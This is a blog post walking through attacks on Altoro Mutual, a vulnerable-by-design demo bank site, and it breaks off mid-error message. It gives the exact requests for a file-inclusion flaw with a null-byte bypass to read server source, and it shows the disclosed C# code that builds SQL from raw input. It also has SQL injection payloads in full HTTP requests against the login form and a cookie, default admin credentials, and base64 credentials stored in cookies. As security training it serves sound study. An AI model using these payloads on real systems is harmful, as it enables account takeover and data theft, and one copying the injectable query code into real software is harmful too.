<!DOCTYPE html>
<html lang="en">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="keywords" content="hacking, security, wargames, web, appsec">
        <meta name="description" content="Contents 1 IntroductionÂ 2 Vulnerabilities by URL 2.1 /default.aspx?content= 2.2 /bank 2.3 /bank/login.aspx 2.3.1 Brute force vulnerability 2.3.2 SQL injection using POST parameters 2.3.3 Base64-encoded login credentials 2.4 /bank/main.aspxÂ 2.4.1 Source code ...">
        <title>Hacking Altoro Mutual - blog.dornea.nu</title>
        <link rel="shortcut icon" type="image/x-icon" href="/favicon.png">
        <link rel="stylesheet" href="/css/ipython.min.css" type="text/css" />
        <link rel="stylesheet" href="../../../../theme/css/bootstrap.min.css" type="text/css" />
        <link rel="stylesheet" href="../../../../theme/font-icons/style.min.css" type="text/css" />
        <link rel="stylesheet" href="../../../../theme/css/niu2.min.css" type="text/css" />
        <link rel="stylesheet" href="/css/custom.css" type="text/css" />
		
        
        <link rel="canonical" href="../../../../2013/05/06/hacking-altoro-mutual" />
        <script type="text/javascript">window.onload=function(){};</script>
        <!--[if lt IE 9]>
            <script src="../../../../theme/js/html5shiv.js"></script>
            <script src="../../../../theme/js/respond.min.js"></script>
        <![endif]-->
    </head>
    <body> 
        <div id="body-header">
            <div class="navbar navbar-inverse navbar-fixed-top">
                <div class="col-md-12">
                    <div class="navbar-header">
                        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                        </button>
                        <a class="navbar-brand" href="../../../..">
                            <i class="icon-home"></i>blog.dornea.nu
                        </a>
                    </div>
                    <nav class="collapse navbar-collapse bs-navbar-collapse" role="navigation">
                        <ul class="nav navbar-nav">
                            <li><a href="http://dornea.nu" title="about">
                                <i class="icon-user"></i>about</a>
                            </li>
                            <li><a href="/archives.html" title="archives">
                                <i class="icon-archive"></i>archives</a>
                            </li>
                            <li><a href="/tags.html" title="tags">
                                <i class="icon-tag"></i>tags</a>
                            </li>
                            <li><a href="/feeds/rss.xml" title="feeds">
                                <i class="icon-rss"></i>feeds</a>
                            </li>
                        <!-- category dropdown list -->
                        <li class="dropdown">
                           <a href="#" class="dropdown-toggle" data-toggle="dropdown">
                                <i class="icon-folder-open"></i>category<b class="caret"></b>
                           </a>
                           <ul class="dropdown-menu">
                               <li><a href="../../../../category/blog">
                                      <i class="icon-pencil"></i>blog
                                      (154)</a></li>
                               <li><a href="../../../../category/notes">
                                      <i class="icon-book"></i>notes
                                      (8)</a></li>
                           </ul>
                        </li>
                        <!--  self defined dropdown list -->
                        </ul>
                        
                        <!-- right nav bar -->
                        <ul class="nav navbar-nav navbar-right">
                        <!-- google custom search -->
                        <li>
                        <div id="niu2-cse-wrapper">
                            <div id="niu2-cse-header-box" class="navbar-form navbar-nav">
                                <form action="http://google.com/cse">
                                    <input type="hidden" name="cx" value="008508447409818574933:pxyxuhrgnxi" />
                                    <input type="hidden" name="ie" value="UTF-8" />
                                    <div class="form-group">
                                        <input id="niu2-cse-search-input" class="niu2-cse-header form-control" 
                                            type="text" name="q" 
                                            placeholder="Press enter to search ..."/>
                                    </div>
                                </form>
                           </div>
                           <div id="niu2-cse-ctrl-box" class="navbar-nav">
                            <i id="niu2-cse-search-image" class="icon-search navbar-nav"></i><span id="niu2-cse-search-text">Search</span>
                           </div>
                       </div>
                       </li>
                       </ul>
                    </nav>
                </div>
            </div>
<style>
    #banner{
        background-image:url("../../../..//images/header.jpg");
    }   
</style>

<div id="banner">
    <div class="container">
        <div class="copy">
            <h2>blog.dornea.nu</h2>
                <p class="intro">Hack, code and drink some țuică. Personal blog of Victor Dorneanu.</p>
        </div>
    </div>
</div>
            <!-- End Banner -->
        </div>

        <div id="body-content">
            <div class="col-md-8 col-md-offset-2">
                <h1 id="content-heading">Hacking Altoro Mutual</h1>
            </div>
            <div id="niu2-left-container" class="col-md-6 col-md-offset-2 with-right-border">
                <div id="niu2-main-content">
                    <div class="toc_wrap_right toc_transparent no_bullets" id="toc_container">
<p class="toc_title">
    Contents
  </p>
<ul class="toc_list">
<li>
<a href="#Introduction"><span class="toc_number toc_depth_1">1</span> IntroductionÂ </a>
</li>
<li>
<a href="#Vulnerabilities_by_URL"><span class="toc_number toc_depth_1">2</span> Vulnerabilities by URL</a><ul>
<li>
<a href="#defaultaspxcontent"><span class="toc_number toc_depth_2">2.1</span> /default.aspx?content=</a>
</li>
<li>
<a href="#bank"><span class="toc_number toc_depth_2">2.2</span> /bank</a>
</li>
<li>
<a href="#bankloginaspx"><span class="toc_number toc_depth_2">2.3</span> /bank/login.aspx</a><ul>
<li>
<a href="#Brute_force_vulnerability"><span class="toc_number toc_depth_3">2.3.1</span> Brute force vulnerability</a>
</li>
<li>
<a href="#SQL_injection_using_POST_parameters"><span class="toc_number toc_depth_3">2.3.2</span> SQL injection using POST parameters</a>
</li>
<li>
<a href="#Base64-encoded_login_credentials"><span class="toc_number toc_depth_3">2.3.3</span> Base64-encoded login credentials</a>
</li>
</ul>
</li>
<li>
<a href="#bankmainaspx"><span class="toc_number toc_depth_2">2.4</span> /bank/main.aspxÂ </a><ul>
<li>
<a href="#Source_code_disclosure"><span class="toc_number toc_depth_3">2.4.1</span> Source code disclosure</a>
</li>
<li>
<a href="#SQL_injection_using_Cookie_data"><span class="toc_number toc_depth_3">2.4.2</span> SQL injection using Cookie data</a>
</li>
<li>
<a href="#XSS_using_cookie_data"><span class="toc_number toc_depth_3">2.4.3</span> XSS using cookie data</a>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</div>
<h1 id="3d259698b7b1fa955b8b4bfd78c184d3"><span id="Introduction">IntroductionÂ </span></h1>
<hr/>
<p>AltoroMutual is an vulnerable-by-design web application created byÂ !WatchFire (nowÂ !AppScan Standard) as a demo test application for theirÂ !BlackBox Scanner. (Source:<a href="https://www.owasp.org/index.php/AltoroMutual">https://www.owasp.org/index.php/AltoroMutual</a>)</p>
<p>The demo can be found atÂ <a href="http://demo.testfire.net/">http://demo.testfire.net/</a>.</p>
<p><strong>This is not an usual wargame!</strong>Â I have simply not found an appropriate name for it.<!--more--></p>
<p> </p>
<h1 id="5aa530919b62444243ee30a0ef52aee1"><span id="Vulnerabilities_by_URL">Vulnerabilities by URL</span></h1>
<hr/>
<p> </p>
<h2 id="765f6e48248fbc7c4d9648b544f5e5c6"><span id="defaultaspxcontent">/default.aspx?content=</span></h2>
<hr/>
<p>There is aÂ <strong>file inclusion vulnerability</strong>Â which we’ll use for further investigation. URLÂ <em><a href="http://demo.testfire.net/default.aspx?content=../testing.txt">http://demo.testfire.net/default.aspx?content=../testing.txt</a></em>Â will show:</p>
<pre>An Error Has Occurred
Summary:
Could not find file 'D:downloadsAltoroMutual_v6website  esting.txt'.
Error Message:
System.IO.FileNotFoundException: Could not find file 'D:downloadsAltoroMutual_v6website esting.txt'. File name: 'D:downloadsAltoroMutual_v6website  esting.txt' at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath) at System.IO.FileStream.Init(String path, FileMode mode, FileAccess access, Int32 rights, Boolean useRights, FileShare share, Int32 bufferSize, FileOptions options, SECURITY_ATTRIBUTES secAttrs, String msgPath, Boolean bFromProxy) at System.IO.FileStream..ctor(String path, FileMode mode, FileAccess access, FileShare share, Int32 bufferSize, FileOptions options) at System.IO.StreamReader..ctor(String path, Encoding encoding, Boolean detectEncodingFromByteOrderMarks, Int32 bufferSize) at System.IO.StreamReader..ctor(String path) at System.IO.File.OpenText(String path) at Altoro.Default.LoadFile(String myFile) in d:downloadsAltoroMutual_v6websitedefault.aspx.cs:line 42 at Altoro.Default.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websitedefault.aspx.cs:line 70 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
</pre>
<p>As you can see we have found the root path of the web application which is atÂ <strong>D:downloads!AltoroMutual_v6website</strong>.</p>
<p><a href="http://static.dornea.nu/img/2013/2760a40b98f8532b3b97df25817f4fd6.png" title="attachment:default.aspx.png"><br/>
<img alt="File inclusion vulnerability" class="img-responsive" height="548" src="http://static.dornea.nu/img/2013/2760a40b98f8532b3b97df25817f4fd6.png" title="attachment:default.aspx.png" width="1007"/></a></p>
<p> </p>
<h2 id="0b6275b4fd4340d418195012eb027c55"><span id="bank">/bank</span></h2>
<hr/>
<p>You’ll find aÂ <strong>directory listening</strong>Â atÂ <a href="http://demo.testfire.net/bank/">http://demo.testfire.net/bank/</a>Â which will show you a lot of information about the applications functionalities.</p>
<pre>5/31/2007 11:10 AM        &lt;dir&gt; 20060308_bak
 1/12/2011 10:14 PM         1831 account.aspx
 1/12/2011 10:14 PM         4277 account.aspx.cs
 1/12/2011 10:14 PM          771 apply.aspx
 1/12/2011 10:14 PM         2828 apply.aspx.cs
 1/12/2011 10:14 PM         2236 bank.master
 1/12/2011 10:14 PM         1134 bank.master.cs
 1/12/2011 10:14 PM          904 customize.aspx
 1/12/2011 10:14 PM         1955 customize.aspx.cs
 1/12/2011 10:14 PM         1806 login.aspx
 1/12/2011 10:14 PM         5847 login.aspx.cs
 1/12/2011 10:14 PM           78 logout.aspx
 1/12/2011 10:14 PM         3361 logout.aspx.cs
 1/12/2011 10:14 PM          935 main.aspx
 1/12/2011 10:14 PM         3951 main.aspx.cs
 5/31/2007 11:10 AM        &lt;dir&gt; members
 1/12/2011 10:14 PM         1414 mozxpath.js
 6/21/2011 10:29 PM          779 queryxpath.aspx
 1/12/2011 10:14 PM         1838 queryxpath.aspx.cs
 1/12/2011 10:14 PM          499 servererror.aspx
 1/12/2011 10:14 PM         1700 transaction.aspx
 1/12/2011 10:14 PM         3826 transaction.aspx.cs
 1/12/2011 10:14 PM         3930 transfer.aspx
 1/12/2011 10:14 PM         3505 transfer.aspx.cs
 1/12/2011 10:14 PM           82 ws.asmx
</pre>
<p>Since the application is written in C# you might want to see whats behind the *.cs files. However clicking on the files will trigger following error message:</p>
<pre>An Error Has Occurred
Summary:
An unknown error occurred.
Error Message:
</pre>
<p><a href="http://static.dornea.nu/img/2013/ad7099c40e16f1a973fbbbfa084100ee.png" title="attachment:cant_access_files.png"><img alt="File inclusion vulnerability" class="img-responsive" height="451" src="http://static.dornea.nu/img/2013/ad7099c40e16f1a973fbbbfa084100ee.png" title="attachment:cant_access_files.png" width="NaN"/></a></p>
<p>So you’ll have to find another way to get to the files. We’ll use theÂ <strong>file inclusion vulnerability</strong>Â found before to do that.</p>
<p><a href="http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs">http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs</a>Â will result in</p>
<pre>Error! File must be of type TXT or HTM
</pre>
<p>We’ll have to bypass the filter in order to get the file. Remember theÂ <strong>null string vulnerability</strong>? Here we go:Â <a href="http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%EF%BF%BD.txt">http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%00.txt</a>.</p>
<p><a href="http://static.dornea.nu/img/2013/8da145f3e6a8fdbe9cbcee892d28b740.png" title="attachment:null_string.png"><img alt="Null string vulnerability" class="img-responsive" height="578" src="http://static.dornea.nu/img/2013/8da145f3e6a8fdbe9cbcee892d28b740.png" title="attachment:null_string.png" width="NaN"/></a></p>
<p>That will show you the content ofÂ <em>/bank/login.aspx.cs</em>. Now you can inspect the the source code to find more vulnerabilities.</p>
<p> </p>
<h2 id="65497bf7a464b98772b9026e8870b752"><span id="bankloginaspx">/bank/login.aspx</span></h2>
<hr/>
<p>Â Source code disclosure</p>
<p>Here is the source code (<a href="http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%EF%BF%BD.txt">http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%00.txt</a>):</p>
<pre>using System.Data;
using System.Data.SqlClient;
using System.Data.OleDb;
using System.Text.RegularExpressions;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.HtmlControls;
using System.Configuration;
namespace Altoro
{
  public partial class Authentication : Page
  {
    protected void Page_Load(object sender, System.EventArgs e)
    {
      // Put user code to initialize the page here
      Response.Cache.SetCacheability(HttpCacheability.NoCache);
      HtmlMeta meta = new HtmlMeta();
      HtmlHead head = (HtmlHead)Page.Header;
      meta.Name = "keywords";
      meta.Content = "Altoro Mutual Login, login, authenticate";
      head.Controls.Add(meta);
      if(Request.Params["passw"] != null)
      {
        String uname = Request.Params["uid"];
        String passwd = Request.Params["passw"];
        String msg = ValidateUser(uname, passwd);
        if (msg == "Success")
        {
            Response.Redirect("main.aspx");
        }
        else
        {
          message.Text = "Login Failed: " + msg;
        }
      }
    }
    protected string ValidateUser(String uName, String pWord)
    {
      //Set default status to Success
      string status = "Success";
      OleDbConnection myConnection = new OleDbConnection();
      myConnection.ConnectionString = ConfigurationManager.ConnectionStrings["DBConnStr"].ConnectionString;
      myConnection.Open();
      string query2 = "SELECT * From users WHERE username = '" + uName + "'";
      string query1 = query2 + " AND password = '" + pWord + "'";
      if (ConfigurationManager.ConnectionStrings["DBConnStr"].ConnectionString.Contains("Microsoft.Jet.OLEDB.4.0"))
      {
          // Hack for MS Access which can not terminate a string
          query1 = Regex.Replace(query1, "--.*", "");
          query2 = Regex.Replace(query2, "--.*", "");
      }
      DataSet ds = new DataSet();
      OleDbDataAdapter myLogin = new OleDbDataAdapter(query1, myConnection);
      myLogin.Fill(ds, "user");
      if (ds.Tables["user"].Rows.Count==0)
      {
              OleDbDataAdapter myFailed = new OleDbDataAdapter(query2, myConnection);
              myFailed.Fill(ds, "user");
        if (ds.Tables["user"].Rows.Count==0)
        {
             status = "We're sorry, but this username was not found in our system.  Please try again.";
        }
        else
        {
            status = "Your password appears to be invalid.  Please re-enter your password carefully.";
        }
      }
      else
      {
                //Get the row returned by the query
                DataRow myRow = ds.Tables["user"].Rows[0];
          //Set the Session variables.
          Session["userId"] = myRow["userid"];
          Session["userName"] = myRow["username"];
          Session["firstName"] = myRow["first_name"];
          Session["lastName"] = myRow["last_name"];
          Session["authenticated"] = true;
          //Close the database collection.
          myConnection.Close();
          //Set UserInfo cookie
          DateTime dtNow = DateTime.Now;
          TimeSpan tsHour = new TimeSpan(0, 0, 180, 0);
          string sCookieUser = new Base64Decoder(uName).GetDecoded();
          HttpCookie UserInfo = Request.Cookies["amUserInfo"];
          if ((UserInfo == null) || (sCookieUser != Session["userName"].ToString()))
          {
              UserInfo = new HttpCookie("amUserInfo");
              UserInfo["UserName"] = new Base64Encoder(uName).GetEncoded();
              UserInfo["Password"] = new Base64Encoder(pWord).GetEncoded();
              UserInfo.Expires = dtNow.Add(tsHour);
              Response.Cookies.Add(UserInfo);
          }
          HttpCookie UserId = Request.Cookies["amUserId"];
          UserId = new HttpCookie("amUserId");
          UserId.Value = Session["userId"].ToString();
          Response.Cookies.Add(UserId);
          query1 = "SELECT userid, approved, card_type,interest, limit FROM promo WHERE userid=" + Session["userId"];
          OleDbDataAdapter myApproval = new OleDbDataAdapter(query1, myConnection);
          myApproval.Fill(ds, "promo");
          DataTable myTable = ds.Tables["promo"];
          DataRow curRow = myTable.Rows[0];
          if (System.Convert.ToBoolean(curRow["approved"]))
          {
            HttpCookie CreditOffer = Request.Cookies["amCreditOffer"];
                CreditOffer = new HttpCookie("amCreditOffer");
            CreditOffer["CardType"] = curRow["card_type"].ToString();
            CreditOffer["Limit"] = curRow["limit"].ToString();
            CreditOffer["Interest"] = curRow["interest"].ToString();
                Response.Cookies.Add(CreditOffer);
          }
      }
      myConnection.Close();
      return status;
    }
      protected string GetUserName()
      {
          HttpCookie UserInfo = Request.Cookies["amUserInfo"];
          if (Request.Params["uid"] != null)
          {
              return Request.Params["uid"].ToString();
          }
          if (UserInfo != null)
          {
              return new Base64Decoder(UserInfo["UserName"]).GetDecoded();
          }
          else
          {
              return "";
          }
      }
    #region Web Form Designer generated code
    override protected void OnInit(EventArgs e)
    {
      //
      // CODEGEN: This call is required by the ASP.NET Web Form Designer.
      //
      InitializeComponent();
      base.OnInit(e);
    }
    /// &lt;summary&gt;
    /// Required method for Designer support - do not modify
    /// the contents of this method with the code editor.
    /// &lt;/summary&gt;
    private void InitializeComponent()
    {
    }
    #endregion
  }
}
</pre>
<p> </p>
<h3 id="c6c7fb86f055418b430d443a7f425228"><span id="Brute_force_vulnerability">Brute force vulnerability</span></h3>
<p>Before we investigate the code, let’s have a look at a much common vulnerability. Go toÂ <a href="http://demo.testfire.net/bank/login.aspx">http://demo.testfire.net/bank/login.aspx</a>Â and use a random user for the login process. You’ll get:</p>
<pre>Login Failed: We're sorry, but this username was not found in our system. Please try again.
</pre>
<p><a href="http://static.dornea.nu/img/2013/caddd36fe5dcb272c298070e4b657721.png" title="attachment:login_bad_username.png"><img alt="Username bruteforce vulnerability" class="img-responsive" height="581" src="http://static.dornea.nu/img/2013/caddd36fe5dcb272c298070e4b657721.png" title="attachment:login_bad_username.png" width="NaN"/></a></p>
<p>You could now easilyÂ <strong>bruteforce</strong>Â common usernames in order to login into the application. The same works with passwords too:Â <em>admin</em>Â seems to be a valid username. Try to bruteforce the password and you’ll get:</p>
<pre>Login Failed: Your password appears to be invalid. Please re-enter your password carefully.
</pre>
<p><a href="http://static.dornea.nu/img/2013/2f37a76687e6b9d6bf3817152cd4cc59.png" title="attachment:login_bad_password.png"><img alt="Password bruteforce vulnerability" class="img-responsive" height="579" src="http://static.dornea.nu/img/2013/2f37a76687e6b9d6bf3817152cd4cc59.png" title="attachment:login_bad_password.png" width="NaN"/></a></p>
<p><em>admin:admin</em>Â is a valid username/password combinationÂ <img alt=":-)" class="img-responsive" height="16" src="http://dornea.nu/moin_static196/mandarin/img/smile.png" title="smiley::-)" width="16"/></p>
<p> </p>
<h3 id="1893267eeefa97c21a09c4e6d7d15585"><span id="SQL_injection_using_POST_parameters">SQL injection using POST parameters</span></h3>
<p>Now let’s have a closer look at the source code… Let’s analyze theÂ <em>!ValidateUser</em>Â function:</p>
<pre>protected string ValidateUser(String uName, String pWord)
    {
      //Set default status to Success
      string status = "Success";
      OleDbConnection myConnection = new OleDbConnection();
      myConnection.ConnectionString = ConfigurationManager.ConnectionStrings["DBConnStr"].ConnectionString;
      myConnection.Open();
      string query2 = "SELECT * From users WHERE username = '" + uName + "'";
      string query1 = query2 + " AND password = '" + pWord + "'";
      if (ConfigurationManager.ConnectionStrings["DBConnStr"].ConnectionString.Contains("Microsoft.Jet.OLEDB.4.0"))
      {
          // Hack for MS Access which can not terminate a string
          query1 = Regex.Replace(query1, "--.*", "");
          query2 = Regex.Replace(query2, "--.*", "");
      }
      ....
</pre>
<p>As you can see theÂ <em>uName</em>Â parameter doesn’t get sanitized, so you can easily run someÂ <strong>SQL injection</strong>. Let’s try that out. UsingÂ <a href="http://www.portswigger.net/burp/">Burpsuite</a>Â we’ll tamper data sent to the web server and analyze the responses.</p>
<p>Here’s the request:</p>
<pre>POST /bank/login.aspx HTTP/1.1
Host: demo.testfire.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Referer: http://demo.testfire.net/bank/login.aspx
Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
uid=admin%27&amp;passw;=test&amp;btnSubmit;=Login
</pre>
<p>As a response you’ll get:</p>
<pre>An Error Has Occurred
Summary:
Syntax error (missing operator) in query expression 'username = 'admin'' AND password = 'test''.
Error Message:
System.Data.OleDb.OleDbException: Syntax error (missing operator) in query expression 'username = 'admin'' AND password = 'test''. at System.Data.OleDb.OleDbCommand.ExecuteCommandTextErrorHandling(OleDbHResult hr) at System.Data.OleDb.OleDbCommand.ExecuteCommandTextForSingleResult(tagDBPARAMS dbParams, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommandText(Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommand(CommandBehavior behavior, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteReaderInternal(CommandBehavior behavior, String method) at System.Data.OleDb.OleDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.OleDb.OleDbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, String srcTable) at Altoro.Authentication.ValidateUser(String uName, String pWord) in d:downloadsAltoroMutual_v6websiteanklogin.aspx.cs:line 68 at Altoro.Authentication.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websiteanklogin.aspx.cs:line 33 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
</pre>
<p><a href="http://dornea.nu/wargames/altoro-mutual?action=AttachFile&amp;do=get&amp;target=login_sql_injection.png" title="attachment:login_sql_injection.png">lkashd oada</a></p>
<p><em>Single quotes</em>Â are obvisouly not escaped so we could inject some SQL statements. Let’s try some common ones likeÂ <strong>admin’ OR 1=1;–</strong>:Â </p>
<pre>POST /bank/login.aspx HTTP/1.1
Host: demo.testfire.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Referer: http://demo.testfire.net/bank/login.aspx
Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
uid=admin' OR 1=1;--&amp;passw;=test&amp;btnSubmit;=Login
</pre>
<p>The result looks very promising! We were able to login without specifying any password. All you need is a valid username. The same vulnerability applies to theÂ <em>password</em>Â field as well. Following request will work too:</p>
<pre>#!highlight c# 
POST /bank/login.aspx HTTP/1.1
Host: demo.testfire.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Referer: http://demo.testfire.net/bank/login.aspx
Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717; amUserInfo=UserName=YWRtaW4nIE9SIDE9MjstLQ==&amp;Password;=dGVzdA==
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
uid=admin&amp;passw;=' OR 1=1;--&amp;btnSubmit;=Login</pre>
<h3 id="67cf80dbb18aadf77119f4a4f5cb98ab"><span id="Base64-encoded_login_credentials">Base64-encoded login credentials</span></h3>
<p>After a successful login the server will set a cookieÂ <em>amUserInfo</em>Â which contains login information encoded in base64. This is for sure a vulnerability since an attacker could easily decode the information and get the login credentials.</p>
<pre>amUserInfo=UserName=YWRtaW4nIE9SIDE9MjstLQ==&amp;Password;=dGVzdA==
</pre>
<p>decodes to…</p>
<pre>amUserInfo=Username=admin' OR 1=2;--&amp;Password;=test
</pre>
<p> </p>
<h2 id="3b289266841a38499874d73cf76dea4c"><span id="bankmainaspx">/bank/main.aspxÂ </span></h2>
<hr/>
<p>After a successful login you’ll be redirected toÂ <a href="http://demo.testfire.net/bank/main.aspx">http://demo.testfire.net/bank/main.aspx</a>. Let’s have a look at the functionalities within this page.</p>
<p> </p>
<h3 id="7dfe4e77b9ff513418fef8297c5f792a"><span id="Source_code_disclosure">Source code disclosure</span></h3>
<p>Here’s the source code (<a href="http://demo.testfire.net/default.aspx?content=../bank/main.aspx.cs%EF%BF%BD.txt">http://demo.testfire.net/default.aspx?content=../bank/main.aspx.cs%00.txt</a>)</p>
<pre>using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Data.OleDb;
using System.Web;
using System.Web.SessionState;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.HtmlControls;
using System.Configuration;
namespace Altoro
{
    /// &lt;summary&gt;
    /// Summary description for welcome.
    /// &lt;/summary&gt;
    public partial class Default : Page
    {
        protected void Page_Load(object sender, System.EventArgs e)
        {
            Response.Cache.SetCacheability(HttpCacheability.NoCache);
            if (!(System.Convert.ToBoolean(Session["authenticated"])))
            {
                Server.Transfer("logout.aspx");
            }
            string thisUser = Request.Cookies["amUserId"].Value;
            DataRow myRow;
            DataTable acctTable = GetAccounts(thisUser);
            CheckPromo(thisUser);
            for (int i = 0; i &lt; acctTable.Rows.Count; i++)
            {
                myRow = acctTable.Rows[i];
                ArrayList myList = new ArrayList();
                myList.Add(myRow["accountid"].ToString());
                myList.Add(myRow["accountid"].ToString() + " " + myRow["acct_type"].ToString());
                listAccounts.myItems.Add(myList);
            }
        }
        private DataTable GetAccounts(string userId)
        {
            OleDbConnection myConnection = new OleDbConnection();
            myConnection.ConnectionString = ConfigurationManager.ConnectionStrings["DBConnStr"].ConnectionString;
            myConnection.Open();
            string query = "SELECT accountid, acct_type From accounts WHERE userid = " + userId;
            OleDbDataAdapter myAccounts = new OleDbDataAdapter(query, myConnection);
            DataSet ds = new DataSet();
            myAccounts.Fill(ds, "accounts");
            DataTable myTable = ds.Tables["accounts"];
            myConnection.Close();
            return myTable;
        }
        private void WritePromo(string cType, string cLimit, string cInterest)
        {
            string promoText = "&lt;table width=590 border=0&gt;";
            promoText += "&lt;tr&gt;&lt;td&gt;&lt;h2&gt;Congratulations! &lt;/h2&gt;&lt;/td&gt;&lt;/tr&gt;";
            promoText += "&lt;tr&gt;&lt;td&gt;You have been pre-approved for an Altoro ";
            promoText += cType;
            promoText += " Visa with a credit limit of $";
            promoText += cLimit;
            promoText += "!&lt;/td&gt;&lt;/tr&gt;";
            promoText += "&lt;tr&gt;&lt;td&gt;Click &lt;a href='apply.aspx";
            promoText += "'&gt;Here&lt;/a&gt; to apply.&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
            promo.Visible = true;
            promo.Text = promoText;
        }
        private void CheckPromo(string strUserId)
        {
            if (Request.Cookies["amCreditOffer"] != null)
            {
                    HttpCookie CreditOffer = Request.Cookies["amCreditOffer"];
              WritePromo(CreditOffer["CardType"], CreditOffer["Limit"], CreditOffer["Interest"]);
            }
        }
        protected String GetSessionValue(String key)
        {
            if (Request.Cookies["amUserId"].Value==Session["userId"].ToString())
            {
                return Session[key].ToString();
                }
                else
                {
                        return "";
                }
        }
        #region Web Form Designer generated code
        override protected void OnInit(EventArgs e)
        {
            //
            // CODEGEN: This call is required by the ASP.NET Web Form Designer.
            //
            InitializeComponent();
            base.OnInit(e);
        }
        /// &lt;summary&gt;
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// &lt;/summary&gt;
        private void InitializeComponent()
        {
        }
        #endregion
    }
}
</pre>
<p> </p>
<h3 id="7b966d041c9c404fa4d83013a8280060"><span id="SQL_injection_using_Cookie_data">SQL injection using Cookie data</span></h3>
<p>After login following request will be sent to the server:</p>
<pre>GET /bank/main.aspx HTTP/1.1
Host: demo.testfire.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Referer: http://demo.testfire.net/bank/login.aspx
Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717; amUserInfo=UserName=YWRtaW4=&amp;Password;=YWRtaW4=; amUserId=1
</pre>
<p>A look at theÂ <em>GetAccounts</em>Â in the source code reveals thatÂ <em>userId</em>Â is actually some data from the cookieÂ <em>amUserId</em>Â and never gets sanitized. Let’s have some fun:</p>
<pre>#!highlight html 
GET /bank/main.aspx HTTP/1.1
...
amUserInfo=UserName=YWRtaW4=&amp;Password;=YWRtaW4=; amUserId=1'
</pre>
<p><em>amUserId</em>Â was changed and the whole GET request was sent again to the server. The response was quite informative:Â </p>
<pre>#!highlight asp-cx 
An Error Has Occurred
Summary:
Syntax error in string in query expression 'userid = 1''.
Error Message:
